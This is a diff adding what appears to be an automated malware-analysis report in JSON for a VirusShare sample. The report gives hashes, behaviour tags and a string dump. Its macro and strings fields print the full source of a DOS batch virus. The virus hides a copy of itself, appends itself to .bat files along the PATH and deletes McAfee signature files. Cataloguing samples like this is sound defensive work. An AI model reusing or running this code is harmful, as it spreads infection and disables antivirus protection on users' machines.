@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off%_FBi%\nif '%1=='FBi goto FBi%2\nset FBi=%0.bat\nif not exist %FBi% set FBi=%0\nif '%FBi%==' set FBi=autoexec.bat\nif exist c:\\_FBi.bat goto FBi_go\nif not exist %FBi% goto evol_FBi\nfind \"FBi\"<%FBi%>c:\\_FBi.bat\nattrib c:\\_FBi.bat +h\n:FBi_go\nif '%!FBi%=='--- goto FBi_exit\nset !FBi=%!FBi%-\ncommand /e:5000 /c c:\\_FBi FBi v . .. \\ %path%\n:evol_FBi\nset FBi=\ngoto FBi_pay\n:FBiv\nshift%_FBi%\nif '%2==' exit FBi\nfor %%a in (%2\\*.bat %2*.bat) do call c:\\_FBi FBi inf %%a\ngoto FBiv\n:FBi_inf\nfind \"FBi\"<%3>nul\nif not errorlevel 1 goto FBi_jump\ntype %3>FBi$\necho.>>FBi$\ntype c:\\_FBi.bat>>FBi$\nmove FBi$ %3>nul\nset FBi!=%FBi!%-\nif %FBi#%==-exit\n:FBi_jump\nset FBi!=%FBi!%-\nif %FBi!%==--exit\n:FBi_pay\nFBi Slovak Hackers Group is a my second home!\necho FBi Slovak Hackers Group to http://www.fbi.sk\necho y| del c:\\mcafee\\*.dat\necho y| del c:\\progra~1\\mcafee\\*.dat\n:FBi_exit"
+    },
+    "filename": "VirusShare_085e299c00d7c3104cb5e917e96cd932",
+    "filesize": 901,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "085e299c00d7c3104cb5e917e96cd932",
+        "sha1": "cba156bf110e475b9b63a642eea4b96823404ea4",
+        "sha256": "847e98918c718e086e9a3814e65f1f1ffec455737b1ecdbfdde1ddcc68c1130d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%_FBi%",
+            "if '%1=='FBi goto FBi%2",
+            "set FBi=%0.bat",
+            "if not exist %FBi% set FBi=%0",
+            "if '%FBi%==' set FBi=autoexec.bat",
+            "if exist c:\\_FBi.bat goto FBi_go",
+            "if not exist %FBi% goto evol_FBi",
+            "find \"FBi\"<%FBi%>c:\\_FBi.bat",
+            "attrib c:\\_FBi.bat +h",
+            ":FBi_go",
+            "if '%!FBi%=='--- goto FBi_exit",
+            "set !FBi=%!FBi%-",
+            "command /e:5000 /c c:\\_FBi FBi v . .. \\ %path%",
+            ":evol_FBi",
+            "set FBi=",
+            "goto FBi_pay",
+            ":FBiv",
+            "shift%_FBi%",
+            "if '%2==' exit FBi",
+            "for %%a in (%2\\*.bat %2*.bat) do call c:\\_FBi FBi inf %%a",
+            "goto FBiv",
+            ":FBi_inf",
+            "find \"FBi\"<%3>nul",
+            "if not errorlevel 1 goto FBi_jump",
+            "type %3>FBi$",
+            "echo.>>FBi$",
+            "type c:\\_FBi.bat>>FBi$",
+            "move FBi$ %3>nul",
+            "set FBi!=%FBi!%-",
+            "if %FBi#%==-exit",
+            ":FBi_jump",
+            "set FBi!=%FBi!%-",
+            "if %FBi!%==--exit",
+            ":FBi_pay",
+            "FBi Slovak Hackers Group is a my second home!",
+            "echo FBi Slovak Hackers Group to http://www.fbi.sk",
+            "echo y| del c:\\mcafee\\*.dat",
+            "echo y| del c:\\progra~1\\mcafee\\*.dat",
+            ":FBi_exit"
+        ],
+        "file": {
+            "echo y| del c:\\mcafee\\*.dat": "Data",
+            "echo y| del c:\\progra~1\\mcafee\\*.dat": "Data"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.fbi.sk"
+        ]
+    },
+    "time": "0:00:00.262717",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
